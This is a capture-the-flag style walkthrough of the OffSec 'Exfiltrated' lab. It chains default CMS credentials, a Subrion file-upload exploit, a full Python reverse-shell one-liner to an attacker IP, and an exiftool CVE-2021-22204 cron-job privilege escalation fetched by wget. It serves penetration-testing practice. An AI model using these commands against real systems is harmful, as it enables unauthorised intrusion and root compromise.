# Exfiltrated

### Enumeration

```
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 09BDDB30D6AE11E854BFF82ED638542B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
```

Subrion CMS 4.2.1

Default credentials - admin:admin

Subrion CMS 4.2.1 - Arbitrary File Upload&#x20;

https://www.exploit-db.com/exploits/49876

### Initial Access

```
$ python3 49876 -u http://exfiltrated.offsec/panel/ --user admin --passw admin
```

Got webshell. Executed this command to reverse shell.

```
export RHOST="192.168.49.145";export RPORT=80;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

### PrivEsc

```
www-data@exfiltrated:/tmp$ cat /etc/crontab
* *     * * *   root    bash /opt/image-exif.sh

---

www-data@exfiltrated:/tmp$ cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

**ExifTool Version Number : 11.88**

exiftool -> CVE-2021-22204-exiftool

[https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/)

> CVE-2021-22204 can be triggered with a perfectly valid image (jpg, tiff, mp4 and many more) leading to arbitrary code execution! Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44(to 12.24+) and up allows arbitrary code execution when parsing the malicious image.

[https://github.com/convisolabs/CVE-2021-22204-exiftool](https://github.com/convisolabs/CVE-2021-22204-exiftool)

```
$ sudo apt install djvulibre-bin exiftool
```

Change the IP and Port in the exploit.py file

```
$ git clone https://github.com/convisolabs/CVE-2021-22204-exiftool.git
$ cd CVE-2021-22204-exiftool
$ python3 exploit.py
```

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.49.145/image.jpg
```
